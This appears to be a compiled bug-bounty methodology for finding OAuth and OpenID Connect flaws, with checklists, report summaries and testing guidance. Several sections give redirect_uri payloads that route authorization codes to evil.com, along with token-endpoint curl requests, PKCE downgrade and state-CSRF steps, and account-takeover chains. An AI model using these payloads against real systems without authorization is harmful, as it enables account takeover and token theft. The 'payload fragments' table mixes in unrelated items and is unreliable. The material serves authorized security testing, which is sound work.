# Unified upstream methodology

Collected from every contributing repository skill. Deduplicated by content hash; full originals are preserved in `references/upstream-*.md`.

## Discovery and hunting method

### Quick wins

Start here. These are the highest-yield tests for this class.

- Test redirect_uri: suffix, path traversal, open redirect, localhost, custom schemes.
- Test state for CSRF and missing binding to the session.
- Try code reuse, code swapping between clients, and PKCE downgrade.
- Check account linking for takeover via unverified email or provider mixups.

### Deeper checklist

- Test redirect_uri validation: suffix, path traversal, open redirect, localhost, custom schemes.
- Test `state` for CSRF and missing binding to the user session.
- Try code reuse, code swapping between clients, and PKCE downgrade.
- Check account linking for takeover via unverified email or provider mixups.
- Test token audience/issuer validation in implicit and hybrid flows.
- Look for token leakage via Referer, logs, and postMessage.
- Show account takeover or cross-account access.

### Step-by-Step Hunting Methodology

1. **Enumerate all OAuth entry points**
   - Spider the app for `/oauth`, `/connect`, `/auth`, `/login` paths
   - Check `.well-known/openid-configuration` and `.well-known/oauth-authorization-server`
   - Decompile mobile APKs: `apktool d app.apk` and grep for `redirect_uri`, `intent://`, deep link schemes

2. **Map the full OAuth flow**
   - Capture the authorization request: note `client_id`, `redirect_uri`, `state`, `nonce`, `response_type`
   - Capture the callback: note where tokens/codes land, what validates state/nonce

3. **Test `redirect_uri` validation (highest yield)**
   - Try exact host bypass: `redirect_uri=https://legit.com.evil.com`
   - Try path traversal: `redirect_uri=https://legit.com/callback/../../../evil`
   - Try open redirects on the legitimate domain first, then chain into OAuth
   - Try parameter pollution: `redirect_uri=https://legit.com&redirect_uri=https://evil.com`
   - Try encoded characters: `%2F`, `%40`, `%23` to confuse parsers

4. **Test `state` parameter (CSRF)**
   - Remove `state` entirely — does the flow complete?
   - Reuse a fixed `state` value across sessions
   - Check if `state` is validated server-side or only client-side

5. **Test `nonce` parameter (replay/bypass)**
   - Capture a nonce from one flow, attempt to replay it in another
   - Check if nonce is validated after token exchange
   - Test if nonce can be extracted via referrer leak (step 9)

6. **Test authentication step completeness**
   - For multi-step auth (e.g., email verification + OAuth): can you skip to `/oauth/token` directly?
   - Check if partial auth state (unverified email) is accepted by the token endpoint

7. **Hunt referrer leakage**
   - After OAuth callback with tokens in URL fragment or query, check if any on-page resources (images, scripts, iframes) receive the full `Referer` header
   - Look specifically at language switchers, analytics calls, social share buttons triggered post-auth

8. **Test mobile deep links**
   - For Android: craft malicious intent URIs that redirect the OAuth webview to attacker-controlled URLs
   - Check if deep link handlers validate the origin/host before loading
   - Test `push_notification_webview` patterns that accept arbitrary URLs

9. **Test misconfigured client credentials**
   - Check if `client_secret` appears in JS bundles or APK resources
   - Test if token endpoint accepts arbitrary `redirect_uri` values when combined with leaked `client_id`/`client_secret`

10. **Verify and document**
    - Confirm state is not validated → CSRF to account link
    - Confirm token lands on attacker domain → session theft
    - Confirm email verification skippable → auth bypass
    - Run Gate 0 check before reporting

---

### A. Discovery checklist — concrete places, params, headers, flows to look

- Pull the server metadata first: `/.well-known/openid-configuration` and `/.well-known/oauth-authorization-server` (PortSwigger: even in black-box tests this reveals `registration_endpoint`, `request_uri_parameter_supported`, `require_request_uri_registration`, grant types, `token_endpoint_auth_methods_supported`). Also try `/.well-known/webfinger`.
- Enumerate hidden endpoints never referenced by client HTML: `/authorize`, `/oauth/confirm_access`, `/connect/register`, `/register`, `/token`, `/userinfo`, `/revoke`, `/introspect`, `/api/clients/{id}/logo`. Dynamic Client Registration is a standardized request format — test it even when only reachable from an admin panel.
- At `/authorize`, inventory every parameter and its validation: `client_id`, `redirect_uri`, `response_type` (`code`, `token`, `id_token`, `code id_token`), `scope`, `state`, `nonce`, `code_challenge`/`code_challenge_method`, `request_uri`, `prompt` (`none`, `consent`), `response_mode` (`query`, `fragment`, `form_post`, `web_message`), and issuer hints.
- Test both success and failure callbacks and capture full URLs and rendered HTML. High-value reflected params on first-party callback pages: `error`, `error_description`, `message`, `description`, `state` (Base64-decode `state` for PII/workflow state).
- For multi-provider clients, compare cookies, callback paths, `state`, `nonce`, PKCE data and transaction IDs between flows A and B; reset with `nonce` in OIDC and `iss` in authorization responses (RFC 9207).
- Grep JS bundles/source maps/mobile APKs for `client_secret`, `client_id`, hard-coded OAuth endpoints, and `redirect_url` reflection sinks. Inspect `@ModelAttribute`-style parameters that can carry `redirectUri` during internal forwards.

- Inspect the IdP's consent page behavior: `prompt=consent` forces re-approval (useful for session-poisoning chains) while `prompt=none` can silently complete a flow when a session already exists.
- Check whether `redirect_uri` is validated at BOTH `/authorize` and `/token` — PortSwigger explicitly recommends sending it to the token endpoint; many implementations only check the first hop, enabling an attacker to swap the URI at exchange time.
- Test URI parsing differentials between the IdP's validator and its redirector: encoded slashes `%2F`, backslashes, `@`, `?`, `#`, double encoding, trailing dot, userinfo tricks, and IDN homographs.
- Look for open redirects on any allowlisted callback host (user namespaces, CMS uploads, legacy apps) — a strict exact-match policy is defeated if the allowed host itself exposes an open redirect that forwards the code.
- Note token delivery mode: query, fragment, `form_post`, or `web_message`. Fragments survive redirects and can be forwarded via the client-as-open-redirector pattern even with narrow URI patterns (IETF OAuth security topics).
- Check OIDC `id_token` claims: `nonce` (replay protection), `aud` (must equal your client_id), `iss`, `exp`, `iat`, and `azp` for multiple audiences.
- Look for `/.well-known/webfinger` user enumeration and LDAP injection as a side-channel for identifying valid accounts to target in an OAuth account-linking attack.
- Check whether the client stores identity in `localStorage` (MSAL `getAllAccounts()`) rather than validating the bearer token server-side — patching the JS guard is then enough to expose protected routes.
- For desktop AI/agent clients, test whether discovery metadata (`authorization_endpoint`, `token_endpoint`) is passed to an OS URL handler — CVE-2025-6514 (`mcp-remote` ≤0.1.15) turned this into local code execution.

## Signals and surfaces

### Signal

- Reports: **177** · paid: **45**
- Median bounty **$900** · p90 **$4,000** · max **$10,500** · total **$78,222**
- Median upvotes **21**

### Where it pays

| Program | Reports | Bounty | Upvotes |
|---|---|---|---|
| GitLab | 4 | $12,580 | 701 |
| Superhuman (formerly Grammarly) | 1 | $10,500 | 260 |
| GitHub Security Lab | 3 | $8,500 | 12 |
| Snapchat | 1 | $7,500 | 244 |
| X / xAI | 10 | $6,300 | 875 |
| Uber | 5 | $6,000 | 621 |
| Mapbox | 2 | $4,000 | 152 |
| Nextcloud | 18 | $3,850 | 550 |

### Where to look

Parameters, endpoints, and fields that commonly carry this bug:

`redirect_uri` `state` `nonce` `code` `client_id` `scope` `response_type`

### Crown Jewel Targets

OAuth vulnerabilities are among the highest-value bug classes in web security because they directly enable **account takeover, session theft, and authentication bypass** — the trifecta that programs pay most for.

**Highest-value targets:**
- **Consumer identity providers** (Google, Facebook, PayPal, Apple SSO integrations) — any compromise cascades across all relying parties
- **Mobile apps with custom deep link OAuth handlers** — Android/iOS intent handling is notoriously loose
- **Multi-tenant SaaS platforms** (GitLab, Reddit-scale apps) where one OAuth flaw hits millions of accounts
- **Gaming/entertainment platforms** with federated login (Rockstar, Oculus) — often security-immature teams
- **Enterprise SSO connectors** — critical infrastructure, high severity payouts

**Asset types that pay most:**
- OAuth authorization endpoints (`/oauth/authorize`, `/connect/authorize`)
- Token exchange endpoints (`/oauth/token`)
- Mobile deep link handlers (`push_notification_webview`, custom scheme URIs)
- Social login callback handlers (`/auth/callback`, `/oauth/callback`)

**Typical payouts:** $500–$20,000+ depending on program; account takeover findings often hit max bounty.

---

### Response Headers That Signal OAuth

```
Location: https://accounts.example.com/oauth/...
Set-Cookie: oauth_state=
WWW-Authenticate: Bearer
Content-Type: application/json (with access_token in body)
```

### Tech Stack Signals

- Android apps with `intent-filter` in `AndroidManifest.xml` handling `http://` or custom scheme URIs
- Apps using Doorkeeper, OmniAuth, Devise (Ruby), Passport.js (Node), Spring Security OAuth
- Social login buttons (Google, Facebook, Apple) = OAuth surface guaranteed
- `.well-known/openid-configuration` present = full OIDC surface available

---

## Techniques, payloads and bypasses

### Payloads & probes

- `redirect_uri=https://target.com.evil.com` `redirect_uri=https://target.com%2f@evil.com`
- `redirect_uri=https://target.com/callback/../../evil`
- `response_type=token` `scope=openid profile email`
- `state=` empty/reused; `nonce=` missing

### Bypass tricks

- Open redirect on an allowlisted callback domain.
- Exploit parser differences in redirect_uri validation.
- Reuse authorization codes across clients or after use.

### Techniques from real reports

One concrete lesson per report (mined from the writeup), newest and most-upvoted first. Read 5–10 before testing.

- **Email Confirmation Bypass in myshop.myshopify.com that Leads to Full Privilege Escalation to Any Shop Owner by Taking Advantage of the Shopify SSO** — `#791775` · Shopify · $0 · ▲1922
  > If you check https://h31ngalog.myshopify.com/ and see the email address of the owner, it is ngalog@hackerone.com, which I obviously would never be able to validate otherwise
- **Shopify Stocky App OAuth Misconfiguration** — `#740989` · Shopify · $0 · ▲527
  > This resulted in a full authentication bypass.
- **Chained Bugs to Leak Victim's Uber's FB Oauth Token** — `#202781` · Uber · $0 · ▲427
  > Next, @ngalog found that the `https://login.uber.com/logout` endpoint would redirect based on the Referer header, making it possible to chain together another redirect.
- **[Urgent] Invalidating OAuth2 Bearer token makes TweetDeck unavailable** — `#210779` · X / xAI · $0 · ▲323
  > According to the documentation, with a valid consumer key and consumer secret pair, one can generate or invalidate existing bearer token: https://dev.twitter.com/oauth/reference/post/oauth2/invalidate/token
- **Able to Takeover Merchants Accounts Even They Have Already Setup SSO, After Bypassing the Email Confirmation** — `#796956` · Shopify · $0 · ▲310
  > Here's the magic step, note that the url path is `/login` now at stage3, change the path to `/accounts merge/new-password` while keeping the query part the same
- **Insufficient OAuth callback validation which leads to Periscope account takeover** — `#110293` · X / xAI · $0 · ▲277
  > callback url = a/../../login?redirect after login=https://cards.twitter.com/card id
- **OAuth `redirect_uri` bypass using IDN homograph attack resulting in user's access token leakage** — `#861940` · Semrush · $0 · ▲265
  > IDN homography attack exploits the fact that many different characters look alike such as `semrush.com` is different from `sеmrush.com` because in the latter we used the Cyrillic letter `е` which looks exactly like the latin `e`.
- **Ability to DOS any organization's SSO and open up the door to account takeovers** — `#976603` · Superhuman (formerly Grammarly) · $10,500 · ▲260
  > So if you have `myentity` as the legitimate entity, and an attacker sets their entity to `myentity[SPACE]` (with a space at the end); users attempting to authenticate into the legitimate `myentity` will technically authenticate against it, but then the…
- **Ability to bypass email verification for OAuth grants results in accounts takeovers on 3rd parties** — `#922456` · GitLab · $3,000 · ▲257
  > It's possible to play the `/oauth/authorize` request directly to bypass the `Verify the email address in your account profile before you sign in.` prompt.
- **Stealing Users OAuth authorization code via redirect_uri** — `#1861974` · pixiv · $2,000 · ▲253
  > Path traversal vulnerability in this `redirect uri` parameter allows the attacker to direct the user to the product page created by the attacker.
- **Stealing SSO Login Tokens (snappublisher.snapchat.com)** — `#265943` · Snapchat · $7,500 · ▲244
  > `https://snappublisher.snapchat.com/api/v1/media/████/file/somthine.svg?%23pranav` this redirects with `307` status code to `storage.googleapis.com/creativesuite-prod-media/ ` with `SSO login token ticket` in ` hashfragment` carried forward by browser.
- **Unauthenticated blind SSRF in OAuth Jira authorization controller** — `#398799` · GitLab · $4,000 · ▲238
  > - send a `POST` request to the `/-/jira/login/oauth/callback` endpoint, as shown below.
- **Stealing Facebook OAuth Code Through Screenshot viewer** — `#488269` · Rockstar Games · $0 · ▲200
  > We have resolved the image injection vulnerability, thereby preventing the potential exfiltration of sensitive authentication tokens.
- **Mint Oauth2 access token for targeted user** — `#1148364` · GitLab · $5,580 · ▲140
  > `doorkeeper application%5Btrusted%5D=0&doorkeeper application%5Btrusted%5D=1& ` This will allow us to create an application that is trusted by default.
- **Admin Panel Accessed (OAuth Bypassed )** — `#294911` · Mapbox · $4,000 · ▲133
  > The vulnerability allowed them to bypass OAuth authentication and generate a valid session for the site.
- **[First 30] Stored XSS on login.uber.com/oauth/v2/authorize via redirect_uri parameter** — `#392106` · Uber · $3,000 · ▲131
  > Stored XSS execution at https://login.uber.com due to unsanitized user-supplied input passed through Privacy Policy URL.
- **Referer Leakage Vulnerability in  socialclub.rockstargames.com/crew/ leads to FB'S OAuth token theft.** — `#787160` · Rockstar Games · $0 · ▲112
  > The Open Redirect is the subject of a separate report; in this report, we addressed the problem by strengthening the Referer header policy with `<meta name="referrer" content="origin" / `.
- **[Meetup][World ID][OIDC] Insufficient Filtering of "state" Parameter in Response Mode form_post leads to XSS and ATO** — `#2515808` · Tools for Humanity · $0 · ▲106
  > A blog post about this report including technical details can be found here: https://security.lauritz-holtmann.de/advisories/tfh-form post-xss-ato/
- **Insecure Zendesk SSO implementation by generating JWT client-side** — `#638635` · Trint Ltd · $0 · ▲102
  > Looking at some of the UI views, I stumbled upon `static/js/modules/auth/pages/ZendeskLoadingPage.js`.
- **User account compromised authentication bypass via oauth token impersonation** — `#739321` · Picsart · $0 · ▲101
  > The Solution was to Validate that access token belongs to PicsArt client id via provider API.
- **Group restriction bypass via bearer token in user_oidc (SETTING_RESTRICT_LOGIN_TO_GROUPS not enforced in Backend::getCurrentUserId)** — `#3572848` · Nextcloud · $150 · ▲100
  > This could allow users outside whitelisted groups to access the Nextcloud API with a valid bearer token.
- **SQL Injection on prod.oidc-proxy.prod.webservices.mozgcp.net via invite_code parameter - Mozilla social inscription** — `#2209130` · Mozilla · $0 · ▲93
  > When entering an invitation code, the user is redirected to `prod.oidc-proxy.prod.webservices.mozgcp.net`.
- **Misconfigured oauth leads to Pre account takeover** — `#1074047` · Bumble · $0 · ▲90
  > 1: Go to https://badoo.com/en/signup/ and signup using the unregistered victim's account.
- **Incorrect details on OAuth permissions screen allows DMs to be read without permission** — `#434763` · X / xAI · $2,940 · ▲80
  > The iPhone keys and Google TV keys (as seen on https://gist.github.com/shobotch/5160017) present an OAuth screen which says the app "Will not be able to: Access your direct messages."
- **OAuth redirect uri validation bypass for :proxima_first_party_sync apps** — `#3588801` · GitHub · $0 · ▲79
  > [CVE-2026-4296](https://nvd.nist.gov/vuln/detail/CVE-2026-4296)
- **CSRF protection on OIDC login is broken** — `#1878381` · Nextcloud · $500 · ▲77
  > So I assume the bug is also the same https://github.com/nextcloud/user oidc/blob/main/lib/Controller/Id4meController.php L175-L181
- **`use-mcp`'s oauth2 process uses a window.open call with untrusted mcp server provided data allowing for code execution under the page using it** — `#3211031` · Cloudflare Public Bug Bounty · $550 · ▲75
  > The `authorizeEndpoint` parameter from `use-mcp` version was susceptible to XSS.
- **CSRF on Periscope Web OAuth authorization endpoint** — `#215381` · X / xAI · $0 · ▲74
  > At minimum, I found endpoints that allow creating a broadcast (https://public-api.periscope.tv/v1/broadcast/create), tweeting it (https://public-api.periscope.tv/v1/broadcast/publish) and deleting a broadcast…
- **Facebook OAuth Code Theft through referer leakage on support.rockstargames.com** — `#482743` · Rockstar Games · $0 · ▲71
  > This was done by injecting an `<img ` tag containing a payload pointing to the attacker's own domain into replies of Support Community forum threads.
- **Open Redirect Vulnerability in OAuth Flow Leading to Potential Phishing Attack** — `#3099816` · Lichess · $0 · ▲70
  > Change this from`redirect uri=https://www.lichess4545.com/auth/lichess/` to `redirect uri=https://example.com/auth/lichess/`

### Payload fragments observed

Recurring payloads from this class's writeups. Adapt, don't paste blindly.

| Seen | Fragment |
|---:|---|
| 5× | `Curl_auth_allowed_to_host()` |
| 4× | `wp_redirect()` |
| 4× | `Curl_auth_allowed_to_origin()` |
| 4× | `data->state.creds` |
| 3× | `$count = 1` |
| 3× | `conn->bits.netrc` |
| 3× | `support+1@trint.com` |
| 3× | `@rpath` |
| 3× | `url_set_data_creds_netrc()` |
| 2× | `ngalog+1@wearehackerone.com` |
| 2× | `https://snappublisher.snapchat.com/sso_continue?ticket=<stolen token>` |
| 2× | `GET → 404 {"status":404,"error":"Not Found"}` |
| 2× | `https://github.com/login?client_id=5f45cc999f7812d0b6d2&return_to=%2Flogin%2Foauth%2Fauthorize%3Fclient_id%3D5f45cc999f7812d0b6d2%26redirect` |
| 2× | `str_replace( OPENVERSE_SUBPATH, '', $path, $count )` |
| 2× | `str_replace()` |
| 2× | `wp_safe_redirect()` |
| 2× | `get_target_url()` |
| 2× | `wp_sanitize_redirect()` |
| 2× | `wp_validate_redirect()` |
| 2× | `GET / HTTP/1.1 / Host: hostname.tld:9999 / User-Agent: curl/7.83.0-DEV / Accept: */* / Authorization: secrettoken / Cookie: secretcookie` |

### Email Confirmation Bypass in myshop.myshopify.com that Leads to Full Privilege Escalation to Any Shop Owner by Taking Advantage of the Shopify SSO

`#791775` · Shopify · $0 · critical · 2020-04-01 · ▲1922
> It's possible to take over any store account through bypassing the email confirmation step in .myshopify.com. I found a way to confirm arbitrary emails, and after confirming arbitrary email in .myshopify.com, user is able to integrate with other Shopify store that shares the same email address by setting a master password for all of the stores(if the owner hasn't integrated before), effectively taking over every Shopify stores by knowing just the owner's…

### Common Root Causes

1. **Weak `redirect_uri` validation** — developers whitelist by prefix (`startsWith`) rather than exact match, or whitelist an entire domain instead of specific paths. A sub-path open redirect on the same domain then becomes a full token theft primitive.

2. **Missing or unvalidated `state` parameter** — developers implement OAuth by following basic tutorials that omit CSRF protection, or validate state client-side only in JavaScript (easily bypassed).

3. **Nonce not validated post-exchange** — nonce is generated and sent in the request but never verified against the ID token after the code exchange, making replay attacks possible.

4. **Authentication step ordering not enforced server-side** — teams implement multi-step auth (signup → email verify → OAuth grant) but don't enforce the sequence server-side. The token endpoint doesn't check completion of prerequisite steps.

5. **Token/code in URL with outbound requests on callback page** — developers land users on a callback page with tokens in the query string, then that page fires analytics, social share, or CDN requests that leak the full URL via `Referer` header.

6. **Mobile deep link handlers trust all input URLs** — Android/iOS developers build webview wrappers for push notification flows without validating that the loaded URL belongs to their own domain.

7. **Misconfigured OAuth application registration** — developers register wildcard redirect URIs (`https://*.example.com/*`) or don't restrict them at all during development and forget to lock down for production.

8. **Client secrets embedded in mobile apps** — treating confidential client credentials as public, enabling an attacker with the secret to perform token requests with arbitrary redirect URIs.

9. **OIDC `sub` claim ambiguity across identity providers** — apps accepting login from multiple IdPs (Google, Microsoft, Apple) may key accounts on `sub` alone without IdP isolation. If two IdPs emit the same `sub` for different users, one IdP's attacker hijacks accounts linked to the other IdP.

---

### Scenario 2: Email Verification Bypass via Direct Token Endpoint Access (GitLab pattern)

A developer creates an account with an unverified email address. Normally the platform blocks full access until email is verified. However, the `/oauth/token` endpoint performs no verification status check — it only validates credentials. The attacker calls `/oauth/token` directly with valid (unverified) credentials and receives a fully-scoped OAuth token. This token passes all downstream authorization checks. Result: complete authentication bypass, allowing unverified/disposable email accounts to gain full platform access, undermining the email verification security control entirely. At scale on a platform like GitLab, this affects CI/CD pipeline access, repository access, and API usage.

### B. Techniques & bypasses — specific actionable techniques/payload shapes

- redirect_uri validation bypasses (HackTricks): no validation; weak regex (`evilmatch.com`, `match.com.evil.com`, `match.com.mx`, `matchAmatch.com`, `evil.com#match.com`, `match.com@evil.com`); IDN punycode vs Unicode mismatch; allowlisted host with an open redirect or attacker-controlled subpath (`/openredirect?next=...`, user namespaces, CMS uploads); directory pattern `/oauth/*` bypassed via `/oauth/../anything`; wildcard subdomains; `http://` callbacks.
- Steal the code on an *allowlisted* domain: set `redirect_uri` to a trusted host/path with attacker-controlled content so `token`/`blob`/`code` land in `window.location` and JS exfiltrates them — FB Accounts Center `blob=<BLOB>&token=<TOKEN>` pattern.
- `state` attacks: remove it entirely; use a static/predictable/state-fixated value; tamper with returned `state`; replay the attacker's own final `?code=&state=` URL against a victim via link/iframe/form. Missing or unbound `state` = login CSRF/account linking.
- PKCE downgrade: remove `code_challenge` and `code_challenge_method` from an attacker-initiated flow, obtain a non-PKCE code, inject it into the victim's pending callback; the client sends its own `code_verifier` but the token endpoint ignores it. Also try omitting `code_verifier`, flipping `S256` → `plain`, one-character verifier changes.
- Code lifetime/replay: redeem a captured code after 5–10 minutes (RFC 6749 wants minutes), send the same code twice, race two parallel redemptions; a replay should also revoke already-minted tokens. Cross-client swap: redeem app A's code at app B's token endpoint.
- Session poisoning from PortSwigger research: `GET /authorize?client_id=<trusted>&...&prompt=consent` + hidden `GET /oauth/confirm_access?client_id=<trusted>&...&redirectUri=<evil>` — `redirectUri` binds to the model attribute via mass assignment while the trusted client id wins approval.
- Dynamic Client Registration SSRF: `POST /connect/register {"redirect_uris":["..."],"logo_uri":"http://collaborator/","jwks_uri":"...","sector_identifier_uri":"...","request_uris":["..."]}`; trigger with `/api/clients/{id}/logo` or `/authorize?...&request_uri=<collaborator>/request.jwt`.
- Open Dynamic Client Registration + PKCE: register an attacker client with `redirect_uris:["https://attacker/callback"]`, send the victim through `/authorize` with your `client_id`, and redeem with your own verifier — PKCE does not stop a malicious registered client.
- Multi-provider mix-up: keep flows A and B pending, complete in reverse; replay B's response at A's callback; point an attacker-controlled issuer's `authorization_endpoint` at the honest issuer while keeping an attacker `token_endpoint`.
- Verb/extras: `prompt=none` silent approval; `response_mode=fragment`/`web_message` code delivery; two-link `RU` cookie redirect trick; Referer/telemetry leaks of `code`/`state`; Cognito `update-user-attributes` email change; OIDC discovery metadata forwarded to OS URL handlers (CVE-2025-6514 `mcp-remote` RCE).

- Dynamic Client Registration SSRF detail: `logo_uri` is fetched when the approval page or `/api/clients/{id}/logo` is hit; `jwks_uri` is fetched at `/token` when `client_assertion` is a `jwt-bearer`; `sector_identifier_uri` may be fetched at registration or at authorization time. Each needs its own trigger test.
- Pre-ATO account linking: create an account at the target using the victim's email *before* they sign up with a social provider; when they later use OAuth, the IdP identity can be linked to the attacker's pre-created account.
- `@ModelAttribute` poisoning variant: the confirmed `client_id` can be trusted while `redirectUri` (camel-case model attribute name, not `redirect_uri`) is attacker-supplied on `/oauth/confirm_access` — the parameter-name difference is intentional.
- Login CSRF via `state` replay: attacker completes their own flow, suppresses the final callback, then induces the victim to load `callback?code=<attacker-code>&state=<attacker-state>` so the victim is logged into the attacker's account.
- Cross-provider transaction confusion: keep flows for provider A and B pending, then complete B at A's callback. If global cookies hold `state`/`nonce`/verifier, one provider's value satisfies the other's callback and an attacker's social identity can be attached to a victim account.
- `response_mode=web_message` exfiltration: the code is posted via `window.opener.postMessage(...)` — check whether the receiving origin check is missing so any opener can read it.
- Two-link `RU` cookie trick: set the redirect cookie in one tab via a visible `returnUrl`, close before the warning, then open a second flow without the visible parameter — the consent prompt omits the attacker host while the cookie still redirects the token there.
- Wildcard CORS on OAuth endpoints is usually an amplifier, not the root ATO cause — note it but keep the proof focused on code/token leakage and exchange.
- AWS Cognito primitive: `cognito-idp get-user` then `update-user-attributes --user-attributes Name=email,Value=<attacker>` with a victim access token can enable account takeover if the app trusts an unverified email change.

### redirect_uri Bypass Payloads

```
# Host confusion
https://evil.com#legit.com
https://legit.com.evil.com
https://legit.com@evil.com

# Path traversal
https://legit.com/oauth/callback/../../redirect?url=https://evil.com

# Open redirect chain (find open redirect on legit domain first)
https://legit.com/logout?next=https://evil.com

# Parameter pollution
?redirect_uri=https://legit.com/cb&redirect_uri=https://evil.com/cb

# URL encoded slashes
https://legit.com%2F@evil.com
https://legit.com%252F..%252F..evil.com
```

### Token Endpoint Auth Bypass

```bash
# Test unauthenticated token exchange (skip email verification)
curl -X POST https://target.com/oauth/token \
  -d "grant_type=authorization_code" \
  -d "code=CAPTURED_CODE" \
  -d "client_id=CLIENT_ID" \
  -d "redirect_uri=https://legit.com/callback"

# Test with unverified account credentials
curl -X POST https://target.com/oauth/token \
  -d "grant_type=password" \
  -d "username=unverified@evil.com" \
  -d "password=password123" \
  -d "client_id=CLIENT_ID"
```

### Browser-parse vs server-parse — redirect_uri prefix-match bypass shapes

A server-side prefix-match flaw on `redirect_uri` is **necessary but not sufficient** to land the OAuth code on the attacker. The server check passing is one gate; the browser actually navigating cross-origin is another. They behave differently. Always confirm both before writing the finding as a chain → ATO.

| Server `redirect_uri` validator | Attack URL | Server `startswith()` | Browser actual host | Exploit? |
|---|---|---|---|---|
| prefix = `https://acme.example` (no slash) | `https://acme.example@evil.com/cb` | passes | evil.com (per WHATWG URL parsing — `@` is the userinfo delimiter, BEFORE the first `/` after `://`) | **YES** |
| prefix = `https://acme.example/` (trailing slash) | `https://acme.example/@evil.com/cb` | passes | **acme.example** (the `@` is now AFTER the first `/`, so WHATWG parses it as a path character) | **NO** — browser stays on acme.example |
| prefix = `https://acme.example` (substring match) | `https://acme.example.evil.com/cb` | passes | acme.example.evil.com (subdomain extension — the `.evil.com` extends the host) | **YES** |
| prefix = `https://acme.example/` (trailing slash, server normalizes `..`) | `https://acme.example/../../@evil.com/cb` | passes raw startswith | acme.example (server normalizes path; even if it didn't, browser path-normalizes too) | usually **NO** |
| prefix = `https://acme.example/` (Chromium-specific) | `https://acme.example/\@evil.com/cb` | passes | host depends — Chromium converts `\` to `/` so this becomes `https://acme.example//@evil.com/cb` and stays on acme.example | usually **NO** |

**Operational rule:** the WHATWG URL parser (used by all modern browsers since 2018) does userinfo parsing ONLY in the authority section — i.e., **before the first `/` after `://`**. Once the path begins, `@` is just a character. Server-side string-startswith checks don't model this — they pass URLs the browser will then route to the legitimate host.

**Always headless-test (Playwright / Puppeteer / a real browser) the final navigation BEFORE writing the OAuth finding as ATO-chain.** Server-side accept + browser-side stay-on-legitimate-host = **not** ATO. Verified live in `docs/verification/phase3-playwright-browser-execution.md` Test 29.

---

## Validation and proof

### Reporting bar

- Prove real impact on a second controlled account or a safe callback.
- Keep the PoC minimal and reproducible; include raw requests and exact IDs.
- Stay inside program scope and follow disclosure rules.

### Reporting bar

- Prove real impact on a second controlled account or a safe callback.
- Keep the PoC minimal and reproducible; include raw requests and exact IDs.
- Stay inside program scope and follow disclosure rules.

---

<!-- ============ PART 2: BUG HUNTER METHODOLOGY (execution + validation) ============ -->

### Gate 0 Validation

Before writing the report, answer all three:

**1. What can the attacker DO right now?**
Be specific: "I can send victim a crafted URL → victim clicks → their OAuth code redirects to my server → I exchange code for access token → I am now logged in as victim." If you can't complete this full chain, it may be informational only.

**2. What does the victim LOSE?**
Minimum bar: victim loses authenticated session (account access). Higher bars: victim loses linked accounts, payment methods, private data. If the attacker only learns the victim's identity without gaining access, severity drops significantly.

**3. Can it be reproduced in 10 minutes from scratch?**
Open a fresh browser/device with no prior state. If you can walk from "unauthenticated" to "authenticated as victim" in 10 minutes using only your written steps, the bug is real and reportable. If it requires lucky timing, specific victim behavior beyond "click a link," or network position, document those dependencies explicitly.

---

### C. Validation / proof bar — how to confirm and avoid false positives

- A redirect alone is not ATO. Capture the victim's `code`/token, complete the server-side exchange, and demonstrate access to a victim-only resource or a state change on the victim account. State-only leakage is Low.
- Bind the transaction to issuer/client/redirect/state/nonce/PKCE and validate the authorization-response `iss` against the value stored at flow start; do not claim mix-up from a single mismatched URL alone.
- On refresh rotation, respect grace windows; claim missing reuse detection only after the active token family survives an explicit replay outside that window. DPoP: a duplicate proof within the allowed `jti` window is not itself a standards violation.
- Confirm blind SSRF (logo/jwks/sector_identifier/request_uri) with an out-of-band hit and note the trigger step — these are often second-order, fetched only at consent/token exchange.
- Do not report a leaked `client_secret` as ATO unless you also show a stolen code or a token minted for the victim; public clients cannot keep secrets, so check whether PKCE is actually enforced.
- For `error_description` reflection, show executed JS (browser-specific events like Safari `onpagereveal`) or a coherent phishing page, not just HTML presence. Redact tokens/codes in evidence.

- For the code-exchange step, use the client's real `/token` call (with its `client_secret` or PKCE verifier) and show a victim-API response, not merely that a code landed on your domain.
- When testing `error_description` reflection, prove either script execution or a convincing credential-phishing page on the trusted origin — HTML presence alone is a low-severity XSS/HTML-injection issue.
- For DPoP/mTLS downgrade, test each API host and version independently: one resource server enforcing the binding does not prove the rest do.
- A stolen authorization code that cannot be redeemed (wrong client, redirect, or PKCE verifier) is not ATO — state exactly which checks were bypassed.
- Open dynamic client registration is only impactful if you can get a victim to approve your client; document the approval step and whether `prompt=consent` was needed.
- Confirm blind SSRF from registration with an out-of-band callback and note the exact fetch trigger; many servers save URL parameters and resolve them only later during the flow.
- For multi-provider mix-up, verify the authorization-response `iss` — accepting a value different from the stored issuer is the crux; a mere callback path difference is not enough.
- Check whether the victim's token/session actually changes privileges — login CSRF into an attacker's *low-privilege* account is not equivalent to account takeover of the victim.
- Redact codes, tokens, `state`, and victim PII in PoCs; callback URLs often contain all four and are easy to over-share in screenshots.

### Defender: Host validation on mobile deep links

**Bypass:** Try URL encoding (`https%3A//evil.com`), double encoding, Unicode normalization, or null bytes to confuse the validator while the underlying webview still navigates correctly.

### Defender: Nonce validation

**Bypass:** Check if nonce is validated client-side in JavaScript only. Intercept and modify the ID token's nonce claim if the signature isn't verified (rare but seen in misconfigured implementations). Also test if nonce is validated on *initial* request but not on token refresh.

---

## Escalation and related chains

### Escalation chains

- OAuth redirect -> token theft -> ATO.
- Account linking -> ATO.

### Chained Bugs to Leak Victim's Uber's FB Oauth Token

`#202781` · Uber · $0 · high · 2019-01-25 · ▲427
> The Facebook OAuth application was misconfigured to allow any URL that followed the https://auth.uber.com/login? format to be provided as a redirect uri. By taking advantage of this, @ngalog was able to discover that the next url parameter could be added to the redirect uri allowing it to be chained further.

### Related Skills & Chains

- **`subdomain-takeover`** — The single highest-impact OAuth chain. Chain primitive: OAuth `redirect_uri` validator accepts any `*.target.com` subdomain + recon reveals `dev-staging.target.com` CNAMEs to a deprovisioned Heroku/S3/Azure app → claim the dangling subdomain → host an OAuth callback receiver there → craft `/oauth/authorize?redirect_uri=https://dev-staging.target.com/cb` → victim clicks → auth code lands on attacker-claimed subdomain → exchange for token → ATO. The redirect_uri whitelist passed because the subdomain is "legitimately" under target.com control.
- **`account-takeover`** — OAuth state-CSRF is the textbook ATO-via-account-linking primitive. Chain primitive: `state` parameter absent or not session-bound + victim is already logged into target.com + attacker initiates OAuth flow from their own account, captures `code` before exchange + crafts callback URL with attacker's code → forces victim to visit → victim's target.com session is now linked to attacker's Google/Facebook identity → attacker logs in via Google → owns victim's account.
